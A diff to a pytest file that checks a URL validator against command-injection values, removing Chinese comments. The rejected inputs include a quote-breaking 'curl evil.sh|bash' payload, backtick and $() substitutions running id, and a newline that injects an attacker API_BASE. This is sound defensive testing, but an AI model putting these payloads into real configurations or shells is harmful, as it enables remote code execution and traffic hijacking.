@@ -48,16 +48,15 @@ class TestPublicBaseUrlShape:
     @pytest.mark.parametrize(
         "bad",
         [
-            # 闭合双引号后追加命令
             'https://api.superdl.cn";curl evil.sh|bash;#',
-            "https://api.superdl.cn`id`",  # 反引号命令替换
-            "https://api.superdl.cn$(id)",  # $() 命令替换
-            "https://api.superdl.cn\nAPI_BASE=http://evil",  # 换行后另起赋值行
-            "https://api.superdl.cn\\",  # 反斜杠续行,吃掉下一行
-            "https://api superdl.cn",  # 空白拆词
-            "ftp://api.superdl.cn",  # 非 http(s) 协议
-            "api.superdl.cn",  # 缺协议头
-            "https://api.superdl.cn/x;y",  # 路径里的分号
+            "https://api.superdl.cn`id`",
+            "https://api.superdl.cn$(id)",
+            "https://api.superdl.cn\nAPI_BASE=http://evil",
+            "https://api.superdl.cn\\",
+            "https://api superdl.cn",
+            "ftp://api.superdl.cn",
+            "api.superdl.cn",
+            "https://api.superdl.cn/x;y",
         ],
     )
     def test_rejects_injectable_values(self, bad: str):
@@ -70,7 +69,7 @@ class TestPublicBaseUrlShape:
         [
             "https://api.superdl.cn",
             "https://api.superdl.example.com",
-            "http://localhost:8000",  # dev 形态:协议闸门只在 prod 生效
+            "http://localhost:8000",
             "https://api.superdl.cn:8443/base-path",
         ],
     )
